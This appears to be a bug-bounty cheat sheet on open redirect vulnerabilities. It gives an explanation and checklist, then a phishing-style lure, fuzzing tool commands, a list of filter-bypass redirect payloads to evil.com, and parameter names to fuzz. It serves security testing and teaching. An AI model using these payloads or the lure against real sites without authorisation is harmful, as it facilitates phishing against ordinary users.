# Open redirects

## What is it?

An Open Redirect Vulnerability allows an attacker to redirect a user to an arbitrary website of the attacker's choosing. It occurs when an application incorporates user-supplied data into a URL which causes a redirection to that URL. This can be used to facilitate phishing attacks, steal sensitive information, or perform other malicious activities.

**A simple example**

Consider a website that uses a URL parameter to redirect the user to a specified page. For example: [http://website.com/redirect?site=http://some-site.com](http://website.com/redirect?site=http://some-site.com). An attacker could replace "[http://some-site.com](http://some-site.com)" with a malicious site, then trick a user into following the crafted link.

Open Redirects can lead to: Phishing attacks Disclosure of sensitive information Malware installation Execution of arbitrary scripts

Other learning resources: OWASP: [https://owasp.org/www-community/attacks/Unvalidated\\\\\_Redirects\\\\\_and\\\\\_Forwards](https://owasp.org/www-community/attacks/Unvalidated/_Redirects/_and/_Forwards) PortSwigger: [https://portswigger.net/web-security/unvalidated-redirects](https://portswigger.net/web-security/unvalidated-redirects)

### **Checklist**

* [ ] Does the application use redirection functions that include user-supplied input?
* [ ] Are redirects implemented without validation of the target URL?
* [ ] Can an attacker manipulate the redirection URL to point to an arbitrary domain?
* [ ] Does the application append user-supplied input into the URL causing the redirection?

### Exploitation

Craft an URL with redirection to a malicious site

```
http://website.com/redirect?site=http://malicious-site.com
```

Trick the user into clicking the link

```
"You've won a prize! Click here to claim: http://website.com/redirect?site=http://malicious-site.com"
```

### Tools

```bash
#https://github.com/devanshbatham/OpenRedireX
python3 openredirex.py -u "https://website.com/?url=FUZZ" -p payloads.txt --keyword FUZZ

#https://github.com/0xNanda/Oralyzer
python3 oralyzer.py -u https://website.com/redir?url=

# Payload generator
# https://gist.github.com/zPrototype/b211ae91e2b082420c350c28b6674170
```

### Payloads

```bash
# Check for
=aHR0
=http
# https://github.com/m0chan/BugBounty/blob/master/OpenRedirectFuzzing.txt

https://web.com/r/?url=https://phising-malicious.com
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect

# Check redirects
https://url.com/redirect/?url=http://twitter.com/
http://www.theirsite.com@yoursite.com/
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
/http://twitter.com/
/\\twitter.com
/\/twitter.com
?c=.twitter.com/
/?redir=google。com
//google%E3%80%82com
//google%00.com
/%09/google.com
/%5cgoogle.com
//www.google.com/%2f%2e%2e
//www.google.com/%2e%2e
//google.com/
//google.com/%2f..
//\google.com
/\victim.com:80%40google.com
https://target.com///google.com//
# Remember url enconde the payloads!

# Search in Burp:
“=http” or “=aHR0”（base64 encode http）

# Fuzzing openredirect

# Intruder url open redirect
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}

# Valid URLs:
http(s)://evil.com
http(s):\\evil.com
//evil.com
///evil.com
/\evil.com
\/evil.com
/\/evil.com
\\evil.com
\/\evil.com
/ /evil.com
\ \evil.com

# Oneliner with gf
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```
